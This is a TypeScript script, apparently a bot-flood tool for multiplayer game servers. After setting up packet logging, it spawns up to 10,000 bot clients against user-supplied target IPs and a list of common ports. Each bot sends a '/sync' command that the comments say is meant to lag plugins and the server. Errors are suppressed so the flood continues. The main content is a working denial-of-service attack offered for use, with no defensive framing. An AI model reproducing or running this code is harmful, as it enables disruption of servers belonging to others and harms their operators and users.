import {Log, LogLevel, SuperLogHandler} from './ultimate-logger';
import PacketHandler from "./packets/packet-handler";
import MessagePacket from "./packets/message-packet";
import MessagePacket2 from "./packets/message-packet2";
import ChatEntity from "./chat-entity";
import WorldData from "./packets/world-data-packet";
import StreamBegin from "./packets/stream-begin";
import StreamChunk from "./packets/stream-chunk";

Log.level = LogLevel.debug;
Log.logger = new SuperLogHandler();

PacketHandler.instance.on(70, (packet: MessagePacket) => Log.info("SMP1|>|", packet));
PacketHandler.instance.on(71, (packet: MessagePacket2) => Log.info("SMP2|>|", packet));
PacketHandler.instance.on(2, (packet: WorldData) => Log.info("WD|>|", packet));

PacketHandler.instance.on(0, (packet: StreamBegin) => {
    Log.info("STREAM BEGIN|<" + packet.pid + ">|", packet.type, packet.total);
    PacketHandler.instance.runChunks(packet)
});

PacketHandler.instance.on(1, (packet: StreamChunk) => {
    Log.info("STREAM CHUNK|<" + packet.pid + ">|", PacketHandler.instance.pushChunk(packet));
});

var ports = ['6567','6568','6569','6570','6571','6572','6573','6574']; //bot will try to enter most common ports
var ips = [''] // change this to your target ip's or ip
try {
for (let i = 0; i < 10000; i++) { //change this to how many bots you want to spawn
    setTimeout(() => {
        let port = parseInt(ports[(Math.random() * ports.length) | 0])
        let conip = String(ips[(Math.random() * ips.length) | 0])
        let name = String(Math.floor(Math.random() * 1000))

        const en = new ChatEntity(conip, port, name, false);
        en.sendMessage("/sync"); //specific command to lag plugins/server
    }, 300);//WARNING MIGHT CRASH YOUR PC/VPS
}
}catch(e){
}
process.on('uncaughtException', function (exception) {
    console.log(exception);
    return;
});
//setTimeout(() => en.sendMessage("/sync"), 3000)
//setTimeout(() => {
//    while (true) en.sendRuntime()
//}, 2000);
